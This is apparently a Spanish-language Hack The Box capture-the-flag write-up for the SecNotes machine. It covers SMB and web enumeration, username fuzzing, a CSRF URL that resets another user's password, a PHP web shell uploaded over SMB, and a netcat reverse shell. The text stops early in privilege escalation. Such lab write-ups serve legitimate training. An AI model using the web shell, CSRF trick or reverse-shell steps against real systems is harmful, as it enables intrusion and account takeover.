@@ -1,0 +1,545 @@
+<!doctype html>
+<html lang="es">
+<head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>HackTheBox - SecNotes (medium) · MiguelRega7</title>
+<meta name="description" content="- SecNotes is a medium difficulty machine, which highlights the risks associated with weak password change mechanisms, lack of CSRF protection and insufficient validation of user i"><meta name="theme-color" content="#070a0f">
+<link rel="icon" href="/favicon.ico"><link rel="stylesheet" href="/style.css">
+</head>
+<body>
+<header class="header"><div class="nav wrap">
+<a class="brand" href="/" aria-label="MiguelRega7">MR<em>7</em></a>
+<nav class="links"><a class="nav-link" data-nav="home" href="/">INICIO</a><a class="nav-link" data-nav="writeups" href="/#writeups">WRITEUPS</a><a class="nav-link" data-nav="about" href="/about/">ABOUT</a></nav>
+<div class="socials">
+<a href="https://github.com/MikeRega7" target="_blank" rel="noreferrer" aria-label="GitHub"><svg viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M12 .7a11.5 11.5 0 0 0-3.64 22.4c.58.1.79-.25.79-.56v-2.04c-3.2.7-3.87-1.35-3.87-1.35-.52-1.32-1.27-1.67-1.27-1.67-1.04-.71.08-.7.08-.7 1.15.08 1.75 1.18 1.75 1.18 1.02 1.74 2.67 1.24 3.32.95.1-.74.4-1.24.72-1.53-2.55-.29-5.24-1.28-5.24-5.7 0-1.26.45-2.29 1.18-3.1-.12-.3-.51-1.46.11-3.05 0 0 .96-.31 3.15 1.18a10.9 10.9 0 0 1 5.73 0c2.19-1.49 3.15-1.18 3.15-1.18.62 1.59.23 2.75.11 3.05.74.81 1.18 1.84 1.18 3.1 0 4.43-2.7 5.4-5.26 5.69.41.35.77 1.04.77 2.1v3.07c0 .31.21.67.8.55A11.5 11.5 0 0 0 12 .7Z"/></svg></a>
+<a href="https://www.linkedin.com/in/juan-miguel-regalado-nu%C3%B1o-a3b14b278" target="_blank" rel="noreferrer" aria-label="LinkedIn"><svg viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M5.2 3.2A2.2 2.2 0 1 1 5.2 7.6a2.2 2.2 0 0 1 0-4.4ZM3.4 8.9h3.6V20H3.4V8.9Zm5.8 0h3.4v1.52h.05c.47-.9 1.62-1.84 3.34-1.84 3.57 0 4.23 2.35 4.23 5.4V20h-3.55v-5.34c0-1.27-.02-2.91-1.77-2.91-1.78 0-2.05 1.39-2.05 2.82V20H9.2V8.9Z"/></svg></a>
+<a href="https://www.instagram.com/_miguelitornuno7" target="_blank" rel="noreferrer" aria-label="Instagram"><svg viewBox="0 0 24 24" aria-hidden="true"><path fill="none" stroke="currentColor" stroke-width="1.8" d="M7 2.9h10A4.1 4.1 0 0 1 21.1 7v10a4.1 4.1 0 0 1-4.1 4.1H7A4.1 4.1 0 0 1 2.9 17V7A4.1 4.1 0 0 1 7 2.9Z"/><circle cx="12" cy="12" r="3.3" fill="none" stroke="currentColor" stroke-width="1.8"/><circle cx="17.5" cy="6.7" r=".9" fill="currentColor"/></svg></a>
+
+</div><button class="menu" type="button" aria-label="Abrir menú" aria-expanded="false">☰</button>
+</div></header>
+<main class="wrap"><header class="article-head"><a class="back" href="/#writeups">← VOLVER A WRITEUPS</a><div class="article-head-row"><div><span class="article-tag">Hack The Box</span><h1>HackTheBox - SecNotes (medium)</h1><div class="meta"><span>◷</span><time>2026-02-08</time><span>·</span><span>WRITEUP</span><span>·</span><span>MR7 LAB</span></div></div><div class="share"><span>Compartir</span><button type="button" class="share-btn" data-copy-url="true">↗</button></div></div><p class="article-excerpt">- SecNotes is a medium difficulty machine, which highlights the risks associated with weak password change mechanisms, lack of CSRF protection and insufficient validation of user i.</p></header><div class="article-layout"><aside class="aside"><div class="aside-title">CONTENIDO</div><a href="#nmap">Nmap</a><a href="#enumeraci-n">Enumeración</a><a href="#xss">XSS</a><a href="#csrf">CSRF</a><a href="#shell-as-tyler-and-user-flag">Shell as tyler and User flag</a><a href="#privilege-escalation">Privilege Escalation</a><a href="#shell-as-administrator-and-root-flag">Shell as administrator and root flag</a></aside><article class="article-content" id="top"><p align="center"><img src="https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/50c8eaf2cd0fe953a71141b06bd88817.png"></p>
+
+<ul>
+<li>SecNotes is a medium difficulty machine, which highlights the risks associated with weak password change mechanisms, lack of CSRF protection and insufficient validation of user input. It also teaches about Windows Subsystem for Linux enumeration.</li>
+</ul>
+<h2 id="nmap">Nmap</h2>
+<ul>
+<li>Estos son los puertos abiertos y los servicios que corren en la máquina.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ nmap -sCV -p80,445,8808 10.129.16.60 -oN targeted
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-07 17:13 -0600
+Nmap scan report for 10.129.16.60
+Host is up (0.081s latency).
+
+PORT     STATE SERVICE      VERSION
+80/tcp   open  http         Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+| http-title: Secure Notes - Login
+|_Requested resource was login.php
+445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: HTB)
+8808/tcp open  http         Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-title: IIS Windows
+Service Info: Host: SECNOTES; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2026-02-07T23:13:28
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_clock-skew: mean: -49s, deviation: 0s, median: -49s
+</code></pre></div></div>
+<h2 id="enumeraci-n">Enumeración</h2>
+<ul>
+<li>Vemos a que nos estamos enfrentando.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ netexec smb 10.129.16.60
+SMB         10.129.16.60    445    SECNOTES         [*] Windows 10 / Server 2016 Build 17134 (name:SECNOTES) (domain:SECNOTES) (signing:False) (SMBv1:True)
+</code></pre></div></div>
+<ul>
+<li>Vemos que no podemos ver los recursos compartidos a nivel de red por SMB.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ smbclient -L 10.129.16.60 -N
+session setup failed: NT_STATUS_ACCESS_DENIED
+</code></pre></div></div>
+<ul>
+<li>Vemos las tecnologías que están corriendo en el puerto 80.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ whatweb http://10.129.16.60
+http://10.129.16.60 [302 Found] Cookies[PHPSESSID], Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[10.129.16.60], Microsoft-IIS[10.0], PHP[7.2.7], RedirectLocation[login.php], X-Powered-By[PHP/7.2.7]
+http://10.129.16.60/login.php [200 OK] Bootstrap[3.3.7], Country[RESERVED][ZZ], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.129.16.60], Microsoft-IIS[10.0], PHP[7.2.7], PasswordField[password], Title[Secure Notes - Login], X-Powered-By[PHP/7.2.7]
+</code></pre></div></div>
+<ul>
+<li>Vemos un panel de login.</li>
+</ul>
+<p align="center"><img src="/assets/hackthebox/img/machines/medium/SecNotes/1.png"></p>
+
+<ul>
+<li>Este es el IIS que corren el puerto 8808.</li>
+</ul>
+<p align="center"><img src="/assets/hackthebox/img/machines/medium/SecNotes/2.png"></p>
+
+<ul>
+<li>Si probamos con admin:admin vemos que en la respuesta nos dice que no se encontro usuario con ese username  lo cual gracias a eso ya podemos hacer Fuzzing para poder encontrar algun usuario valido.</li>
+</ul>
+<p align="center"><img src="/assets/hackthebox/img/machines/medium/SecNotes/3.png"></p>
+
+<ul>
+<li>Aquí vemos como se tramita la data.</li>
+</ul>
+<p align="center"><img src="/assets/hackthebox/img/machines/medium/SecNotes/4.png"></p>
+
+<ul>
+<li>Encontramos 1 usuario.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ wfuzz -c -t 200 --hs &quot;No account found with that username.&quot; --hw=90 -w /usr/share/seclists/Usernames/Names/names.txt -d 'username=FUZZ&amp;password=password' http://10.129.16.60/login.php
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.129.16.60/login.php
+Total requests: 10713
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                              
+=====================================================================
+
+000010015:   200        34 L     91 W       1276 Ch     &quot;tyler&quot;
+</code></pre></div></div>
+<ul>
+<li>Vemos que el usuario existe pero no sabemos su contraseña.</li>
+</ul>
+<p align="center"><img src="/assets/hackthebox/img/machines/medium/SecNotes/5.png"></p>
+
+<ul>
+<li><p>Lo que vamos hacer es registrarnos en Sign up now  y después conectarnos.</p>
+</li>
+<li><p>Vemos lo siguiente.</p>
+</li>
+</ul>
+<p align="center"><img src="/assets/hackthebox/img/machines/medium/SecNotes/6.png"></p>
+
+<h2 id="xss">XSS</h2>
+<ul>
+<li>Si probamos un payload básico vemos que se ejecuta.</li>
+</ul>
+<p align="center"><img src="/assets/hackthebox/img/machines/medium/SecNotes/7.png"></p>
+
+<p align="center"><img src="/assets/hackthebox/img/machines/medium/SecNotes/8.png"></p>
+
+<ul>
+<li>Algo que también podemos probar es ver si el usuario Tyler revisa nuestros archivos ya que podemos enviarle un mensaje así que vamos a probar viendo si accede a un recurso que le diremos y ver si obtenemos la petición.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+</code></pre></div></div>
+<p align="center"><img src="/assets/hackthebox/img/machines/medium/SecNotes/9.png"></p>
+
+<ul>
+<li>Vemos que recibimos la petición.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.129.16.60 - - [07/Feb/2026 18:03:13] code 404, message File not found
+10.129.16.60 - - [07/Feb/2026 18:03:13] &quot;GET /yiyi HTTP/1.1&quot; 404 -
+</code></pre></div></div>
+<h2 id="csrf">CSRF</h2>
+<ul>
+<li><p>Si recordamos hay un apartado de cambiar la contraseña si tu pruebas cambiando la contraseña de tu usuario te va a dejar pero tenemos el correo de tyler y podemos enviarle mensajes entonces podemos probar para cambiarle su contraseña.</p>
+</li>
+<li><p>Vamos abrirnos el BurpSuite.</p>
+</li>
+<li><p>Vamos a capturar la petición donde cambiemos nuestra contraseña al darle al botón de submit.</p>
+</li>
+<li><p>Si analizamos se envía por el método POST.</p>
+</li>
+</ul>
+<p align="center"><img src="/assets/hackthebox/img/machines/medium/SecNotes/10.png"></p>
+
+<ul>
+<li><p>Vamos a cambiarlo a GEThaber si se cambia.</p>
+</li>
+<li><p>Le damos a Forward.</p>
+</li>
+</ul>
+<p align="center"><img src="/assets/hackthebox/img/machines/medium/SecNotes/11.png"></p>
+
+<p align="center"><img src="/assets/hackthebox/img/machines/medium/SecNotes/12.png"></p>
+
+<ul>
+<li>Si vamos a Sign Out y nos volvemos a conectar con la contraseña la cual cambiamos vemos que funciona.</li>
+</ul>
+<p align="center"><img src="/assets/hackthebox/img/machines/medium/SecNotes/13.png"></p>
+
+<ul>
+<li><p>Vamos a volver a interceptar una petición donde hagamos un Change Password.</p>
+</li>
+<li><p>Y cambiamos el método a GET.</p>
+</li>
+</ul>
+<p align="center"><img src="/assets/hackthebox/img/machines/medium/SecNotes/14.png"></p>
+
+<ul>
+<li>Vamos a cambiarnos la estructura de la URL para poder cambiarle la contraseña al usuario Tyler.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">change_pass.php?password=test123&amp;confirm_password=test123&amp;submit=submit
+</code></pre></div></div>
+<ul>
+<li>Ahora copiamos y pegamos y le enviamos el mensaje.</li>
+</ul>
+<p align="center"><img src="/assets/hackthebox/img/machines/medium/SecNotes/15.png"></p>
+
+<ul>
+<li><p>Ahora esperamos un poco y nos conectamos como tyler y ponemos la contraseña que establecimos.</p>
+</li>
+<li><p>Funciona.</p>
+</li>
+</ul>
+<p align="center"><img src="/assets/hackthebox/img/machines/medium/SecNotes/16.png"></p>
+
+<ul>
+<li>Vemos una contraseña la cual supuestamente es del usuario tyler.</li>
+</ul>
+<p align="center"><img src="/assets/hackthebox/img/machines/medium/SecNotes/17.png"></p>
+
+<ul>
+<li>La contraseña es valida.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ netexec smb 10.129.16.60 -u 'tyler' -p '92g!mA8BGjOirkL%OG*&amp;'
+SMB         10.129.16.60    445    SECNOTES         [*] Windows 10 / Server 2016 Build 17134 (name:SECNOTES) (domain:SECNOTES) (signing:False) (SMBv1:True) 
+SMB         10.129.16.60    445    SECNOTES         [+] SECNOTES\tyler:92g!mA8BGjOirkL%OG*&amp;
+</code></pre></div></div>
+<ul>
+<li>Vemos que tenemos capacidad de lectura y escritura en ese directorio.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ netexec smb 10.129.16.60 -u 'tyler' -p '92g!mA8BGjOirkL%OG*&amp;' --shares
+SMB         10.129.16.60    445    SECNOTES         [*] Windows 10 / Server 2016 Build 17134 (name:SECNOTES) (domain:SECNOTES) (signing:False) (SMBv1:True) 
+SMB         10.129.16.60    445    SECNOTES         [+] SECNOTES\tyler:92g!mA8BGjOirkL%OG*&amp; 
+SMB         10.129.16.60    445    SECNOTES         [*] Enumerated shares
+SMB         10.129.16.60    445    SECNOTES         Share           Permissions     Remark
+SMB         10.129.16.60    445    SECNOTES         -----           -----------     ------
+SMB         10.129.16.60    445    SECNOTES         ADMIN$                          Remote Admin
+SMB         10.129.16.60    445    SECNOTES         C$                              Default share
+SMB         10.129.16.60    445    SECNOTES         IPC$            READ            Remote IPC
+SMB         10.129.16.60    445    SECNOTES         new-site        READ,WRITE
+</code></pre></div></div>
+<ul>
+<li>Vemos 2 archivos interesantes.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ smbmap -H 10.129.16.60 -u 'tyler' -p '92g!mA8BGjOirkL%OG*&amp;' --no-banner -r new-site
+[*] Detected 1 hosts serving SMB                                                                                                  
+[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
+                                                                                                                             
+[+] IP: 10.129.16.60:445	Name: 10.129.16.60        	Status: Authenticated
+	Disk                                                  	Permissions	Comment
+	----                                                  	-----------	-------
+	ADMIN$                                            	NO ACCESS	Remote Admin
+	C$                                                	NO ACCESS	Default share
+	IPC$                                              	READ ONLY	Remote IPC
+	new-site                                          	READ, WRITE	
+	./new-site
+	dr--r--r--                0 Sat Feb  7 18:48:03 2026	.
+	dr--r--r--                0 Sat Feb  7 18:48:03 2026	..
+	fr--r--r--              696 Thu Jun 21 15:15:36 2018	iisstart.htm
+	fr--r--r--            98757 Thu Jun 21 15:15:38 2018	iisstart.png
+[*] Closed 1 connections
+</code></pre></div></div>
+<ul>
+<li>Si vamos a la web donde esta el IIS vemos que prácticamente están conéctanos el smb con el IIS.</li>
+</ul>
+<p align="center"><img src="/assets/hackthebox/img/machines/medium/SecNotes/18.png"></p>
+
+<ul>
+<li>Podemos probar metiendo un archivo en la carpeta ya que tenemos privilegios y ver si se refleja en el IIS.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ echo &quot;test&quot; &gt; yiyi.txt
+</code></pre></div></div>
+<ul>
+<li>Ahora subimos el archivo.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ smbclient //10.129.16.60/new-site -U 'tyler%92g!mA8BGjOirkL%OG*&amp;'
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; dir
+  .                                   D        0  Sat Feb  7 18:48:03 2026
+  ..                                  D        0  Sat Feb  7 18:48:03 2026
+  iisstart.htm                        A      696  Thu Jun 21 10:26:03 2018
+  iisstart.png                        A    98757  Thu Jun 21 10:26:03 2018
+
+		7736063 blocks of size 4096. 3391361 blocks available
+smb: \&gt; put yiyi.txt
+putting file yiyi.txt as \yiyi.txt (0.0 kB/s) (average 0.0 kB/s)
+smb: \&gt;
+</code></pre></div></div>
+<ul>
+<li>Y vemos que existe.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ curl -s http://10.129.16.60:8808/yiyi.txt
+test
+</code></pre></div></div>
+<ul>
+<li>Vamos a probar subiendo una webshellen PHP.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ /bin/cat cmd.php
+&lt;?php
+	echo &quot;&lt;pre&gt;&quot; . shell_exec($_REQUEST['cmd']) . &quot;&lt;/pre&gt;&quot;;
+?&gt;
+</code></pre></div></div>
+<ul>
+<li>Ahora lo subimos.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ smbclient //10.129.16.60/new-site -U 'tyler%92g!mA8BGjOirkL%OG*&amp;'
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; put cmd.php
+putting file cmd.php as \cmd.php (0.3 kB/s) (average 0.3 kB/s)
+</code></pre></div></div>
+<ul>
+<li>Podemos ejecutar comandos.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ curl -s 'http://10.129.16.60:8808/cmd.php?cmd=whoami'
+&lt;pre&gt;secnotes\tyler
+&lt;/pre&gt;
+</code></pre></div></div>
+<h2 id="shell-as-tyler-and-user-flag">Shell as tyler and User flag</h2>
+<ul>
+<li><p>Ahora nos vamos a enviar una reverse shell.</p>
+</li>
+<li><p>Pero primero vamos a subir el netcat &lt;<a href="https://eternallybored.org/misc/netcat/">https://eternallybored.org/misc/netcat/</a>&gt;.</p>
+</li>
+<li><p>Tenemos que volver a subir la shell y el nc rápido para que no nos borre los archivos.</p>
+</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ smbclient //10.129.16.60/new-site -U 'tyler%92g!mA8BGjOirkL%OG*&amp;'
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; put nc64.exe
+putting file nc64.exe as \nc64.exe (76.1 kB/s) (average 76.1 kB/s)
+smb: \&gt; put cmd.php
+putting file cmd.php as \cmd.php (0.3 kB/s) (average 53.5 kB/s)
+smb: \&gt;
+</code></pre></div></div>
+<ul>
+<li>Ahora nos ponemos en escucha.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ rlwrap nc -nlvp 443
+listening on [any] 443 ...
+</code></pre></div></div>
+<p align="center"><img src="/assets/hackthebox/img/machines/medium/SecNotes/19.png"></p>
+
+<ul>
+<li>Y ganamos acceso.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ rlwrap nc -nlvp 443
+listening on [any] 443 ...
+connect to [10.10.14.241] from (UNKNOWN) [10.129.16.60] 49322
+Microsoft Windows [Version 10.0.17134.228]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\inetpub\new-site&gt;whoami
+whoami
+secnotes\tyler
+
+C:\inetpub\new-site&gt;
+</code></pre></div></div>
+<ul>
+<li>Vemos la flag.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">C:\Users\tyler\Desktop&gt;type user.txt
+type user.txt
+912d922dc573dc782083c773663ce609
+
+C:\Users\tyler\Desktop&gt;
+</code></pre></div></div>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<ul>
+<li>No tenemos ningún privilegio interesante.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">C:\Users\tyler\Desktop&gt;whoami /priv
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                          State  
+============================= ==================================== =======
+SeShutdownPrivilege           Shut down the system                 Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
+SeUndockPrivilege             Remove computer from docking station Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set       Enabled
+SeTimeZonePrivilege           Change the time zone                 Enabled
+
+C:\Users\tyler\Desktop&gt;
+</code></pre></div></div>
+<ul>
+<li>Si observamos hay un bash.lnk  lo cual es un archivo de acceso directorio de Windows.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">C:\Users\tyler\Desktop&gt;dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 1E7B-9B76
+
+ Directory of C:\Users\tyler\Desktop
+
+08/19/2018  02:51 PM    &lt;DIR&gt;          .
+08/19/2018  02:51 PM    &lt;DIR&gt;          ..
+06/22/2018  02:09 AM             1,293 bash.lnk
+08/02/2021  02:32 AM             1,210 Command Prompt.lnk
+04/11/2018  03:34 PM               407 File Explorer.lnk
+06/21/2018  04:50 PM             1,417 Microsoft Edge.lnk
+06/21/2018  08:17 AM             1,110 Notepad++.lnk
+02/07/2026  03:11 PM                34 user.txt
+08/19/2018  09:59 AM             2,494 Windows PowerShell.lnk
+               7 File(s)          7,965 bytes
+               2 Dir(s)  13,890,383,872 bytes free
+
+C:\Users\tyler\Desktop&gt;
+</code></pre></div></div>
+<ul>
+<li>Vemos que esta ejecutando una bash.exe .</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">C:\Users\tyler\Desktop&gt;type bash.lnk
+type bash.lnk
+L�F w������V�	�v(���	��9P�O� �:i�+00�/C:\V1�LIWindows@	ﾋL���LI.h���&amp;WindowsZ1�L&lt;System32B	ﾋL���L&lt;.p�k�System32Z2��LP� bash.exeB	ﾋL&lt;��LU.�Y���bash.exeK-JںݜC:\Windows\System32\bash.exe&quot;..\..\..\Windows\System32\bash.exeC:\Windows\System32�%�
+                                                                         �wN��]N�D.��Q���`�Xsecnotesx�&lt;sAA��㍧�o�:u��'�/�x�&lt;sAA��㍧�o�:u��'�/�=	�Y1SPS�0��C�G����sf&quot;=dSystem32 (C:\Windows)�1SPS�XF�L8C���&amp;�m�q/S-1-5-21-1791094074-1363918840-4199337083-1002�1SPS0�%��G��`���%
+	bash.exe@������
+                       �)
+                         Application@v(���	�i1SPS�jc(=�����O��MC:\Windows\System32\bash.exe91SPS�mD��pH�H@.�=x�hH�(�bP
+C:\Users\tyler\Desktop&gt;
+</code></pre></div></div>
+<ul>
+<li>Si lo ejecutamos vemos que funciona.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">C:\Users\tyler\Desktop&gt;C:\Windows\System32\bash.exe
+C:\Windows\System32\bash.exe
